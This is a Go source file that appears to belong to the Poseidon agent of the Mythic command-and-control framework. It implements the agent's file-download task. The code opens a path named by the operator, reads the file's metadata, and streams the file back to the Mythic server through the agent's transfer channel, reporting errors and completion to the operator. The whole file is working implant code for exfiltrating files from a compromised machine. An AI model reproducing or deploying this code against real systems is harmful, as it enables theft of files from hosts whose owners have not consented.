package download

import (
	// Standard
	"fmt"
	"os"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

//Run - Function that executes the shell command
func Run(task structs.Task) {
	//File download
	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.Status = "error"
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error opening file: %s", err.Error())
		task.Job.SendResponses <- errResponse
		return
	}
	fi, err := file.Stat()
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.Status = "error"
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
		task.Job.SendResponses <- errResponse
		return
	}
	downloadMsg := structs.SendFileToMythicStruct{}
	downloadMsg.Task = &task
	downloadMsg.IsScreenshot = false
	downloadMsg.SendUserStatusUpdates = true
	downloadMsg.File = file
	downloadMsg.FileName = fi.Name()
	downloadMsg.FullPath = path
	downloadMsg.FinishedTransfer = make(chan int)
	task.Job.SendFileToMythic <- downloadMsg
	// now block this call until we get confirmation that we're done
	<-downloadMsg.FinishedTransfer
	if task.DidStop() {

	} else {
		finishedMsg := structs.Response{}
		finishedMsg.Completed = true
		finishedMsg.UserOutput = "Finished Downloading"
		finishedMsg.TaskID = task.TaskID
		task.Job.SendResponses <- finishedMsg
	}

}
